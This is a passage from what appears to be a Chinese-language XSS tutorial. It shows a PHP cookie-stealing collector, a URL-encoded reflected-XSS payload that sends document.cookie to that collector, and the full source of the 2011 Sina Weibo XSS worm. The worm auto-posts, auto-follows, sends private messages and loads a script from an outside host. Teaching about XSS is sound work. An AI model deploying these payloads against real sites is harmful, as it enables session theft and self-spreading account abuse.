<span class="line"><span style="color:#24292E;">	    $time</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">date</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&#39;Y-m-d g:i:s&#39;</span><span style="color:#24292E;">);</span></span>
<span class="line"><span style="color:#24292E;">	    $ipaddress</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">getenv</span><span style="color:#24292E;"> (</span><span style="color:#032F62;">&#39;REMOTE_ADDR&#39;</span><span style="color:#24292E;">);</span></span>
<span class="line"><span style="color:#24292E;">	    $cookie</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">$_GET[</span><span style="color:#032F62;">&#39;cookie&#39;</span><span style="color:#24292E;">];</span></span>
<span class="line"><span style="color:#24292E;">	    $referer</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">$_SERVER[</span><span style="color:#032F62;">&#39;HTTP_REFERER&#39;</span><span style="color:#24292E;">];</span></span>
<span class="line"><span style="color:#24292E;">	    $useragent</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">$_SERVER[</span><span style="color:#032F62;">&#39;HTTP_USER_AGENT&#39;</span><span style="color:#24292E;">];</span></span>
<span class="line"><span style="color:#24292E;">	    $query</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&quot;insert cookies(time,ipaddress,cookie,referer,useragent) </span></span>
<span class="line"><span style="color:#032F62;">	    values(&#39;</span><span style="color:#24292E;">$time</span><span style="color:#032F62;">&#39;,&#39;</span><span style="color:#24292E;">$ipaddress</span><span style="color:#032F62;">&#39;,&#39;</span><span style="color:#24292E;">$cookie</span><span style="color:#032F62;">&#39;,&#39;</span><span style="color:#24292E;">$referer</span><span style="color:#032F62;">&#39;,&#39;</span><span style="color:#24292E;">$useragent</span><span style="color:#032F62;">&#39;)&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">	    $result</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">mysqli_query</span><span style="color:#24292E;">($link, $query); </span><span style="color:#6A737D;">// 将窃取的数据存入数据库</span></span>
<span class="line"><span style="color:#24292E;">	}</span></span>
<span class="line"><span style="color:#24292E;">	</span><span style="color:#005CC5;">header</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;Location:http://192.168.1.4/pikachu/index.php&quot;</span><span style="color:#24292E;">);</span><span style="color:#6A737D;">//重定向到一个可信的网站，主要起到隐藏作用，避免被发现</span></span>
<span class="line"><span style="color:#24292E;">	</span></span>
<span class="line"><span style="color:#24292E;">	</span><span style="color:#D73A49;">?&gt;</span></span></code></pre></div><p>这个 cookie.php 通过 GET 参数 cookie 来接收数据，那我们向它传递 document.cookie 的值就可以窃取想要的 cookie 了。基于此，我们重新构造 URL。</p><p><strong>注意要做 URL 编码，否则&quot;+&quot;连接符会被吃掉，导致无法窃取 cookie</strong>。</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">http</span><span style="color:#F97583;">:</span><span style="color:#6A737D;">//localhost/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location+%3D+%27http%3A%2F%2Flocalhost%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27+%2B+document.cookie%3B%3C%2Fscript%3E&amp;submit=submit</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">http</span><span style="color:#D73A49;">:</span><span style="color:#6A737D;">//localhost/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location+%3D+%27http%3A%2F%2Flocalhost%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27+%2B+document.cookie%3B%3C%2Fscript%3E&amp;submit=submit</span></span></code></pre></div><p>我们打开 <a href="http://localhost/pkxss/pkxss_login.php" target="_blank" rel="noreferrer">http://localhost/pkxss/pkxss_login.php</a> 上 XSS 后台（第一次使用时按提示点安装，然后用默认帐密登录：admin/123456），可以看到已经成功窃取到Cookie：</p>`,7),N=s("p",null,"图 19：窃取到 Cookie",-1),U=s("p",null,"网上也有很多开源的 XSS 平台用来接收 Cookie，你在GitHub 搜索就可以找到很多，大多数可以直接通过 Docker 快速安装。",-1),G=s("p",null,"图 20：各种开源的 XSS 利用平台",-1),J=s("p",null,"获取 Cookie 后，我们就可以本地修改 Cookie 来登录受害者的账号（除非刚好窃取的 Cookie 不包含用户登录信息，比如未登录状态下访问的攻击链接），可以使用 Chrome 插件 EditThisCookie 来设置窃取的 Cookie：",-1),W=s("p",null,"图 21：EditThisCookie",-1),K=s("p",null,'还有另一款早期业界比较常用的工具，叫"桂林老兵 Cookie 欺骗工具"，以及在《01 | 武器库：常用的渗透测试工具》中介绍的 Burp Suite，它们均支持修改 Cookie。',-1),Y=s("h4",{id:"蠕虫攻击",tabindex:"-1"},[n("蠕虫攻击 "),s("a",{class:"header-anchor",href:"#蠕虫攻击","aria-label":'Permalink to "蠕虫攻击"'},"​")],-1),z=s("p",null,"前面我介绍了 Samy 蠕虫，但并没有谈到XSS 蠕虫的实现技术。XSS 蠕虫的实现正是得益于Ajax 技术的出现，而后者正是 Web2.0 的标志性技术。",-1),Q=s("p",null,[n("Ajax（Asynchronous JavaScript and XML，异步 JavaScript 和 XML）是指一种"),s("strong",null,"创建交互式网页应用的网页开发技术"),n("。这个概念比较抽象，具体讲就是在我们浏览网页，做一些操作时，可以减少浏览器的一些页面重绘操作，避免出现页面抖动、闪现之类的不适体验。这也正是 Web2.0 带来的改变。")],-1),Z=s("p",null,"Ajax 中的核心技术就是 XMLHttpRequest，它允许 JavaScript 脚本与服务器进行通信，在不刷新页面的情况下，向服务器发送请求或是接收服务器的响应数据。",-1),ss=s("p",null,"下面我以之前影响比较大的新浪微博 XSS 蠕虫攻击事件为例，介绍 Ajax 技术在 XSS 蠕虫中的应用，从攻击代码来详细讲解。",-1),ns=l(`<p>图 22 ：新浪微博上感染 XSS 蠕虫的用户</p><p>2011年 6 月 28 日，新浪微博遭受 XSS 蠕虫的攻击，很多受害者被迫发布带有攻击链接的私信和微博。这些消息都带有一定的诱惑性，其他用户点击后也会此影响。受害者在感染后，都会自动关注一位名为&quot;hellosamy&quot;的微博用户（估计是效仿 Samy 蠕虫），然后向关注受害者的用户发送含有同样链接地址的私信，并发布含攻击链接的微博。得益于这种传播方式，在16 分钟内病毒就感染了33000 个用户。</p><p>我们来分析下新浪微博的 XSS 蠕虫代码：</p><div class="language-javascript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#6A737D;">// 创建 XMLHttp 对象用于收发请求</span></span>
<span class="line"><span style="color:#F97583;">function</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">createXHR</span><span style="color:#E1E4E8;">(){ </span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">return</span><span style="color:#E1E4E8;"> window.XMLHttpRequest</span><span style="color:#F97583;">?</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">new</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">XMLHttpRequest</span><span style="color:#E1E4E8;">()</span><span style="color:#F97583;">:</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">new</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">ActiveXObject</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;Microsoft.XMLHTTP&quot;</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"><span style="color:#E1E4E8;">}</span></span>
<span class="line"><span style="color:#F97583;">function</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">getappkey</span><span style="color:#E1E4E8;">(</span><span style="color:#FFAB70;">url</span><span style="color:#E1E4E8;">){</span></span>
<span class="line"><span style="color:#E1E4E8;">    xmlHttp </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">createXHR</span><span style="color:#E1E4E8;">();</span></span>
<span class="line"><span style="color:#E1E4E8;">    xmlHttp.</span><span style="color:#B392F0;">open</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;GET&quot;</span><span style="color:#E1E4E8;">,url,</span><span style="color:#79B8FF;">false</span><span style="color:#E1E4E8;">); </span><span style="color:#6A737D;">//获取 AppKey 不采用异步执行,等待请求返回 </span></span>
<span class="line"><span style="color:#E1E4E8;">    xmlHttp.</span><span style="color:#B392F0;">send</span><span style="color:#E1E4E8;">();</span></span>
<span class="line"><span style="color:#E1E4E8;">    result </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> xmlHttp.responseText;</span></span>
<span class="line"><span style="color:#E1E4E8;">    id_arr </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;&#39;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#6A737D;">// 正则匹配出 AppKey 数组,包含每个被收听用户的 uid </span></span>
<span class="line"><span style="color:#E1E4E8;">    id </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> result.</span><span style="color:#B392F0;">match</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">/</span><span style="color:#DBEDFF;">namecard=</span><span style="color:#85E89D;font-weight:bold;">\\&quot;</span><span style="color:#DBEDFF;">true</span><span style="color:#85E89D;font-weight:bold;">\\&quot;</span><span style="color:#DBEDFF;"> title=</span><span style="color:#85E89D;font-weight:bold;">\\&quot;</span><span style="color:#79B8FF;">[</span><span style="color:#F97583;">^</span><span style="color:#85E89D;font-weight:bold;">\\&quot;</span><span style="color:#79B8FF;">]</span><span style="color:#F97583;">*</span><span style="color:#9ECBFF;">/</span><span style="color:#F97583;">g</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"><span style="color:#E1E4E8;">         </span><span style="color:#B392F0;">https</span><span style="color:#E1E4E8;">:</span><span style="color:#6A737D;">//beefproject.com/</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">for</span><span style="color:#E1E4E8;">(i</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;">;i</span><span style="color:#F97583;">&lt;</span><span style="color:#E1E4E8;">id.</span><span style="color:#79B8FF;">length</span><span style="color:#E1E4E8;">;i</span><span style="color:#F97583;">++</span><span style="color:#E1E4E8;">){</span></span>
<span class="line"><span style="color:#E1E4E8;">        sum </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> id[i].</span><span style="color:#B392F0;">toString</span><span style="color:#E1E4E8;">().</span><span style="color:#B392F0;">split</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&#39;&quot;&#39;</span><span style="color:#E1E4E8;">)[</span><span style="color:#79B8FF;">3</span><span style="color:#E1E4E8;">];  </span><span style="color:#6A737D;">//重新提取整理</span></span>
<span class="line"><span style="color:#E1E4E8;">        id_arr </span><span style="color:#F97583;">+=</span><span style="color:#E1E4E8;"> sum </span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;||&#39;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">    }</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">return</span><span style="color:#E1E4E8;"> id_arr;</span></span>
<span class="line"><span style="color:#E1E4E8;">}</span></span>
<span class="line"><span style="color:#F97583;">function</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">random_msg</span><span style="color:#E1E4E8;">(){</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#6A737D;">// 使用短地址服务，构造 XSS 传播连接，隐藏自己的恶意 js 脚本，</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#6A737D;">// 这里正是 XSS 漏洞的触发位置</span></span>
<span class="line"><span style="color:#E1E4E8;"> </span><span style="color:#6A737D;">//http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=upd</span></span>
<span class="line"><span style="color:#E1E4E8;">    link </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39; http://163.fm/PxZHoxn?id=&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">new</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">Date</span><span style="color:#E1E4E8;">().</span><span style="color:#B392F0;">getTime</span><span style="color:#E1E4E8;">();;</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#6A737D;">// 话题列表 </span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">var</span><span style="color:#E1E4E8;"> msgs </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> [</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#9ECBFF;">&#39;郭美美事件的一些未注意到的细节：&#39;</span><span style="color:#E1E4E8;">,</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#9ECBFF;">&#39;建党大业中穿帮的地方：&#39;</span><span style="color:#E1E4E8;">,</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#9ECBFF;">&#39;让女人心动的 100 句诗歌：&#39;</span><span style="color:#E1E4E8;">,</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#9ECBFF;">&#39;3D 肉团团高清普通话版种子：&#39;</span><span style="color:#E1E4E8;">,</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#9ECBFF;">&#39;这是传说中的神仙眷侣啊：&#39;</span><span style="color:#E1E4E8;">,</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#9ECBFF;">&#39;惊爆!范冰冰艳照真流出了：&#39;</span><span style="color:#E1E4E8;">,</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#9ECBFF;">&#39;杨幂被爆多次被潜规则:&#39;</span><span style="color:#E1E4E8;">,</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#9ECBFF;">&#39;傻仔拿锤子去抢银行：&#39;</span><span style="color:#E1E4E8;">,</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#9ECBFF;">&#39;可以监听别人手机的软件：&#39;</span><span style="color:#E1E4E8;">,</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#9ECBFF;">&#39;个税起征点有望提到 4000：&#39;</span><span style="color:#E1E4E8;">]; </span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#6A737D;">//随机选取话题,加上之前的传播连接作为微博内容 </span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">var</span><span style="color:#E1E4E8;"> msg </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> msgs[Math.</span><span style="color:#B392F0;">floor</span><span style="color:#E1E4E8;">(Math.</span><span style="color:#B392F0;">random</span><span style="color:#E1E4E8;">()</span><span style="color:#F97583;">*</span><span style="color:#E1E4E8;">msgs.</span><span style="color:#79B8FF;">length</span><span style="color:#E1E4E8;">)] </span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;"> link;</span></span>
<span class="line"><span style="color:#E1E4E8;">    msg </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">encodeURIComponent</span><span style="color:#E1E4E8;">(msg); </span><span style="color:#6A737D;">//对内容进行 Url 编码</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">return</span><span style="color:#E1E4E8;"> msg;</span></span>
<span class="line"><span style="color:#E1E4E8;">}</span></span>
<span class="line"><span style="color:#6A737D;">// 利用 Ajax 发送 POST 请求</span></span>
<span class="line"><span style="color:#F97583;">function</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">post</span><span style="color:#E1E4E8;">(</span><span style="color:#FFAB70;">url</span><span style="color:#E1E4E8;">,</span><span style="color:#FFAB70;">data</span><span style="color:#E1E4E8;">,</span><span style="color:#FFAB70;">sync</span><span style="color:#E1E4E8;">){</span></span>
<span class="line"><span style="color:#E1E4E8;">    xmlHttp </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">createXHR</span><span style="color:#E1E4E8;">();</span></span>
<span class="line"><span style="color:#E1E4E8;">    xmlHttp.</span><span style="color:#B392F0;">open</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;POST&quot;</span><span style="color:#E1E4E8;">,url,sync);</span></span>
<span class="line"><span style="color:#E1E4E8;">    xmlHttp.</span><span style="color:#B392F0;">setRequestHeader</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;Accept&quot;</span><span style="color:#E1E4E8;">,</span><span style="color:#9ECBFF;">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"><span style="color:#E1E4E8;">    xmlHttp.</span><span style="color:#B392F0;">setRequestHeader</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;Content-Type&quot;</span><span style="color:#E1E4E8;">,</span><span style="color:#9ECBFF;">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"><span style="color:#E1E4E8;">    xmlHttp.</span><span style="color:#B392F0;">send</span><span style="color:#E1E4E8;">(data);</span></span>
<span class="line"><span style="color:#E1E4E8;">}</span></span>
<span class="line"><span style="color:#6A737D;">// 发表微博，话题随机</span></span>
<span class="line"><span style="color:#F97583;">function</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">publish</span><span style="color:#E1E4E8;">(){</span></span>
<span class="line"><span style="color:#E1E4E8;">    url </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;http://weibo.com/mblog/publish.php?rnd=&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">new</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">Date</span><span style="color:#E1E4E8;">().</span><span style="color:#B392F0;">getTime</span><span style="color:#E1E4E8;">();</span></span>
<span class="line"><span style="color:#E1E4E8;">    data </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;content=&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">random_msg</span><span style="color:#E1E4E8;">() </span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;&amp;pic=&amp;styleid=2&amp;retcode=&#39;</span><span style="color:#E1E4E8;">; </span><span style="color:#6A737D;">//使用 random_msg 生成随机话题</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#B392F0;">post</span><span style="color:#E1E4E8;">(url,data,</span><span style="color:#79B8FF;">true</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"><span style="color:#E1E4E8;">}</span></span>
<span class="line"><span style="color:#6A737D;">// 自动关注用户</span></span>
<span class="line"><span style="color:#F97583;">function</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">follow</span><span style="color:#E1E4E8;">(){</span></span>
<span class="line"><span style="color:#E1E4E8;">    url </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;http://weibo.com/attention/aj_addfollow.php?refer_sort=profile&amp;atnId=profile&amp;rnd=&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">new</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">Date</span><span style="color:#E1E4E8;">().</span><span style="color:#B392F0;">getTime</span><span style="color:#E1E4E8;">();</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#6A737D;">// 使用当前页面存储的$CONFIG.$uid 构造自动关注数据包</span></span>
<span class="line"><span style="color:#E1E4E8;">    data </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;uid=&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">2201270010</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;&amp;fromuid=&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;"> $CONFIG.$uid </span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;&amp;refer_sort=profile&amp;atnId=profile&#39;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#B392F0;">post</span><span style="color:#E1E4E8;">(url,data,</span><span style="color:#79B8FF;">true</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"><span style="color:#E1E4E8;">}</span></span>
<span class="line"><span style="color:#6A737D;">// 发送私信</span></span>
<span class="line"><span style="color:#F97583;">function</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">message</span><span style="color:#E1E4E8;">(){</span></span>
<span class="line"><span style="color:#E1E4E8;">    url </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;http://weibo.com/&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;"> $CONFIG.$uid </span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;/follow&#39;</span><span style="color:#E1E4E8;">; </span><span style="color:#6A737D;">//构造用户关注用户列表页 Url</span></span>
<span class="line"><span style="color:#E1E4E8;">    ids </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">getappkey</span><span style="color:#E1E4E8;">(url); </span><span style="color:#6A737D;">//获取被关注用户的 Appkey 数组</span></span>
<span class="line"><span style="color:#E1E4E8;">    id </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> ids.</span><span style="color:#B392F0;">split</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&#39;||&#39;</span><span style="color:#E1E4E8;">); </span><span style="color:#6A737D;">//分割出每个被关注用户的 Appkey</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">for</span><span style="color:#E1E4E8;">(i</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;">;i</span><span style="color:#F97583;">&lt;</span><span style="color:#E1E4E8;">id.</span><span style="color:#79B8FF;">length</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">1</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">&amp;</span><span style="color:#E1E4E8;"> i</span><span style="color:#F97583;">&lt;</span><span style="color:#79B8FF;">5</span><span style="color:#E1E4E8;">;i</span><span style="color:#F97583;">++</span><span style="color:#E1E4E8;">){</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#6A737D;">//构造私信发送 Url</span></span>
<span class="line"><span style="color:#E1E4E8;">        msgurl </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;http://weibo.com/message/addmsg.php?rnd=&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">new</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">Date</span><span style="color:#E1E4E8;">().</span><span style="color:#B392F0;">getTime</span><span style="color:#E1E4E8;">();</span></span>
<span class="line"><span style="color:#E1E4E8;">        msg </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">random_msg</span><span style="color:#E1E4E8;">();</span></span>
<span class="line"><span style="color:#E1E4E8;">        msg </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">encodeURIComponent</span><span style="color:#E1E4E8;">(msg);</span></span>
<span class="line"><span style="color:#E1E4E8;">        user </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">encodeURIComponent</span><span style="color:#E1E4E8;">(</span><span style="color:#B392F0;">encodeURIComponent</span><span style="color:#E1E4E8;">(id[i]));</span></span>
<span class="line"><span style="color:#E1E4E8;">        data </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;content=&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;"> msg </span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;&amp;name=&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;"> user </span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;&amp;retcode=&#39;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#B392F0;">post</span><span style="color:#E1E4E8;">(msgurl,data,</span><span style="color:#79B8FF;">false</span><span style="color:#E1E4E8;">);  </span><span style="color:#6A737D;">//通过 XmlHttpRequest 发送请求</span></span>
<span class="line"><span style="color:#E1E4E8;">    }</span></span>
<span class="line"><span style="color:#E1E4E8;">}</span></span>
<span class="line"><span style="color:#F97583;">function</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">main</span><span style="color:#E1E4E8;">(){</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">try</span><span style="color:#E1E4E8;">{</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#B392F0;">publish</span><span style="color:#E1E4E8;">(); </span><span style="color:#6A737D;">//模拟发表微博</span></span>
<span class="line"><span style="color:#E1E4E8;">    }</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">catch</span><span style="color:#E1E4E8;">(e){}</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">try</span><span style="color:#E1E4E8;">{</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#B392F0;">follow</span><span style="color:#E1E4E8;">(); </span><span style="color:#6A737D;">//模拟关注用户</span></span>
<span class="line"><span style="color:#E1E4E8;">    }</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">catch</span><span style="color:#E1E4E8;">(e){}</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">try</span><span style="color:#E1E4E8;">{</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#B392F0;">message</span><span style="color:#E1E4E8;">(); </span><span style="color:#6A737D;">//模拟发送私信</span></span>
<span class="line"><span style="color:#E1E4E8;">    }</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">catch</span><span style="color:#E1E4E8;">(e){}</span></span>
<span class="line"><span style="color:#E1E4E8;">}</span></span>
<span class="line"><span style="color:#F97583;">try</span><span style="color:#E1E4E8;">{</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#6A737D;">//在当前 body 尾部插入存放在远端的 Xss 恶意脚本</span></span>
<span class="line"><span style="color:#E1E4E8;">   x</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;g=document.createElement(&#39;script&#39;);g.src=&#39;http://www.2kt.cn/images/t.js&#39;;document.body.appendChild(g)&quot;</span><span style="color:#E1E4E8;">;window.opener.</span><span style="color:#B392F0;">eval</span><span style="color:#E1E4E8;">(x);</span></span>
<span class="line"><span style="color:#E1E4E8;">}</span></span>
<span class="line"><span style="color:#F97583;">catch</span><span style="color:#E1E4E8;">(e){}</span></span>
<span class="line"><span style="color:#B392F0;">main</span><span style="color:#E1E4E8;">();</span></span>
<span class="line"><span style="color:#F97583;">var</span><span style="color:#E1E4E8;"> t</span><span style="color:#F97583;">=</span><span style="color:#B392F0;">setTimeout</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&#39;location=&quot;http://weibo.com/pub/topic&quot;;&#39;</span><span style="color:#E1E4E8;">,</span><span style="color:#79B8FF;">5000</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"><span style="color:#6A737D;">//等待 5 秒跳转到微话题页面</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#6A737D;">// 创建 XMLHttp 对象用于收发请求</span></span>
<span class="line"><span style="color:#D73A49;">function</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">createXHR</span><span style="color:#24292E;">(){ </span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">return</span><span style="color:#24292E;"> window.XMLHttpRequest</span><span style="color:#D73A49;">?</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">new</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">XMLHttpRequest</span><span style="color:#24292E;">()</span><span style="color:#D73A49;">:</span></span>
